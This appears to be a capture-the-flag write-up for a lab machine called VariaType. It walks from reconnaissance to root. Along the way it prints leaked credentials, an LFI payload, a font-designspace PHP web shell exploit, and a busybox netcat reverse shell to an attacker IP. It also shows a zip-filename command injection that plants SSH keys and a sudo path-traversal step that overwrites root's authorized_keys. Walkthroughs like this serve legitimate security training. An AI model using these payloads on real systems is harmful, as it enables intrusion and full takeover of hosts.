### Nmap
```
nmap -sV -sC -vv 10.129.19.112

---OUTPUT---
Nmap scan report for 10.129.19.112
Host is up, received echo-reply ttl 63 (0.079s latency).
Scanned at 2026-04-03 09:49:58 EDT for 10s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 e0:b2:eb:88:e3:6a:dd:4c:db:c1:38:65:46:b5:3a:1e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGaryOd6/hnIT9XPtT08U3YwVShW2VnKYno4lQqs0BQ6ePwGDjLxPcQHcEiiKWd0/mvv39jxHUQAgt069vYV8ag=
|   256 ee:d2:bb:81:4d:a2:8f:df:1c:50:bc:e1:0e:0a:d1:22 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILtP5zMi+IdeNc7bOdDPDwFv+HWDAUakOFYbEIvNSp2z
80/tcp open  http    syn-ack ttl 63 nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Did not follow redirect to http://variatype.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Port 80

![[Pasted image 20260403095614.png]]

## Ffuf
- ffuf reveals a subdomain `portal.variatype.htb`
![[Pasted image 20260403095844.png]]

```
ffuf -u http://variatype.htb/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.variatype.htb" -fw 5

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://variatype.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.variatype.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 5
________________________________________________

portal                  [Status: 200, Size: 2494, Words: 445, Lines: 59, Duration: 18ms]
:: Progress: [114442/114442] :: Job [1/1] :: 2247 req/sec :: Duration: [0:00:49] :: Errors: 0 ::
```

- Subdomain:
![[Pasted image 20260403100046.png]]

- If we click generate font we go to an intersting subdirectory:`/tools/variable-font-generator` this will be important later
![[Pasted image 20260403115209.png]]
- There is a git subdirectory. We can dump using `git-dumper`
```
git-dumper http://portal.variatype.htb/.git git-repo
```

- I check logs but nothing initially vinteresting visible.
- I can check hidden logs with :
```
git fsck --no-reflog --full --unreachable | grep commit

---OUTPUT---
Checking ref database: 100% (1/1), done.
Checking object directories: 100% (256/256), done.
unreachable commit 6f021da6be7086f2595befaa025a83d1de99478b
```

- Reading it I find some credentials:
```
git show 6f021da6be7086f2595befaa025a83d1de99478b
commit 6f021da6be7086f2595befaa025a83d1de99478b
Author: Dev Team <dev@variatype.htb>
Date:   Fri Dec 5 15:59:48 2025 -0500

    security: remove hardcoded credentials

diff --git a/auth.php b/auth.php
index b328305..615e621 100644
--- a/auth.php
+++ b/auth.php
@@ -1,5 +1,3 @@
 <?php
 session_start();
-$USERS = [
-    'gitbot' => 'G1tB0t_Acc3ss_2025!'
-];
+$USERS = [];

```
- Using these credentials `gitbot`:`G1tB0t_Acc3ss_2025!` I can login to `portal.variatype.htb`
![[Pasted image 20260403102233.png]]
- gobuster reveals some subdirectories and `download.php` asks for a file parameter:
![[Pasted image 20260403113906.png]]

![[Pasted image 20260403113921.png]]

- the parameter is `f` (lucky test):
- There is an LFI vulnerability here:
```
http://portal.variatype.htb/download.php?f=....//....//....//....//....//....//etc/passwd
```

- Searching on google `variable font generator exploit` I find a CVE : CVE-2025-66034
- Following this I create the following files: https://github.com/advisories/GHSA-768j-98cg-p3fv
- I create the following 2 files:
- make_fonts.py
```
from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen

def create_font(filename, weight=400):
    fb = FontBuilder(1000, isTTF=True)
    fb.setupGlyphOrder([".notdef"])
    fb.setupCharacterMap({})
    pen = TTGlyphPen(None)
    pen.moveTo((0,0))
    pen.lineTo((500,0))
    pen.lineTo((500,500))
    pen.lineTo((0,500))
    pen.closePath()
    fb.setupGlyf({".notdef": pen.glyph()})
    fb.setupHorizontalMetrics({".notdef": (500, 0)})
    fb.setupHorizontalHeader(ascent=800, descent=-200)
    fb.setupOS2(usWeightClass=weight)
    fb.setupPost()
    fb.setupNameTable({"familyName":"Test","styleName":"W"})
    fb.save(filename)

create_font("source-light.ttf", 100)
create_font("source-regular.ttf", 400)

```
- I run it 
```
python3 make_fonts.py0
```
- I then create the file `malicious.designspace`
```
<designspace format="5.0">
<axes>
<axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
<labelname xml:lang="en"><![CDATA[<?php system($_GET["cmd"]); ?>]]></labelname>
</axis>
</axes>

<sources>
<source filename="source-light.ttf" name="Light">
<location><dimension name="Weight" xvalue="100"/></location>
</source>
<source filename="source-regular.ttf" name="Regular">
<location><dimension name="Weight" xvalue="400"/></location>
</source>
</sources>

<variable-fonts>
<variable-font name="MyFont" filename="/var/www/portal.variatype.htb/public/files/shell.php">
<axis-subsets><axis-subset name="Weight"/></axis-subsets>
</variable-font>
</variable-fonts>
</designspace>
```


- Now I can upload it in the font generator we found in the beginning
- FAlternatively I can pass the curl command to do the same pass them as arguments in the curl command to uplaod them:
```
curl -s -X POST "http://variatype.htb/tools/variable-font-generator/process" \
  -F "designspace=@malicious.designspace" \
  -F "masters=@source-light.ttf" \
  -F "masters=@source-regular.ttf"
```

- I can then access `shell.php` via the portal subdomain to pass commands:
http://portal.variatype.htb/files/shell.php?cmd=id

![[Pasted image 20260403104311.png]]

- Using Burp I send a busybox epxloit to get a shell:
```
GET /files/shell.php?cmd=busybox+nc+10.10.16.126+9999+-e+/bin/sh HTTP/1.1
Host: portal.variatype.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=8ps50pv150508hfi9mg9mnk8f8
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
- I grab  a shell:

![[Pasted image 20260403105303.png]]

Privilege Escalation to steve
Step 7: Generate SSH Key for steve
ssh-keygen -t ed25519 -f steve_key -N "" -C "steve@pwn"
# Public key: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINgrO8KNJoyQAVGH8j0SXVo1ttnRnHJmhkC3vTa8ipdU steve@pwn
Step 8: Create Evil ZIP (CVE-2024-25082)
Script: make_evil_zip.py

import zipfile

pub = open("steve_key.pub","r").read().strip()

# Payload in filename - executed by FontForge cron job
payload = f'x$(mkdir -p /home/steve/.ssh && echo "{pub}" >> /home/steve/.ssh/authorized_keys && chmod 700 /home/steve/.ssh && chmod 600 /home/steve/.ssh/authorized_keys).ttf'

with zipfile.ZipFile("evil.zip","w") as z:
    z.writestr(payload, b"\x00"*100)

print("[+] evil.zip created")
print(f"Payload filename: {payload[:60]}...")
Run:

python3 make_evil_zip.py
Step 9: Upload and Wait for Cron
# Start HTTP server
python3 -m http.server 8888 &

# Download to target via webshell
curl -s "http://portal.variatype.htb/files/shell.php?cmd=wget%20http://<Your_IP_Address>:8888/evil.zip%20-O%20/var/www/portal.variatype.htb/public/files/evil.zip"

# Wait 60 seconds for cron to process
echo "Waiting for cron..."
sleep 60

# SSH as steve
ssh -o StrictHostKeyChecking=no -i steve_key steve@<Tareget_IP> "whoami && cat ~/user.txt"
user.txt: <REDACTED_USER_FLAG>

Privilege Escalation to root
Step 10: Check Sudo Permissions
ssh -o StrictHostKeyChecking=no -i steve_key steve@<Tareget_IP> "sudo -l"
Output:

(root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
Step 11: Exploit Path Traversal in install_validator.py
Generate root SSH key:

ssh-keygen -t ed25519 -f root_key -N "" -C "root@pwn"
Create HTTP server to serve key:

# serve_root_key.py
from http.server import HTTPServer, BaseHTTPRequestHandler

data = open("root_key.pub","rb").read()

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)
    def log_message(self, format, *args):
        pass

HTTPServer(("0.0.0.0", 8889), H).serve_forever()
Run exploit:

# Start server
python3 serve_root_key.py &

# Exploit with URL-encoded absolute path
ssh -o StrictHostKeyChecking=no -i steve_key steve@<Tareget_IP> \
  "sudo /usr/bin/python3 /opt/font-tools/install_validator.py 'http://<Your_IP_Address>:8889/%2Froot%2F.ssh%2Fauthorized_keys'"
Output:

[INFO] Plugin installed at: /root/.ssh/authorized_keys
[+] Plugin installed successfully.
Step 12: SSH as root
	ssh -o StrictHostKeyChecking=no -i root_key root@<Tareget_IP> "whoami && cat /root/root.txt"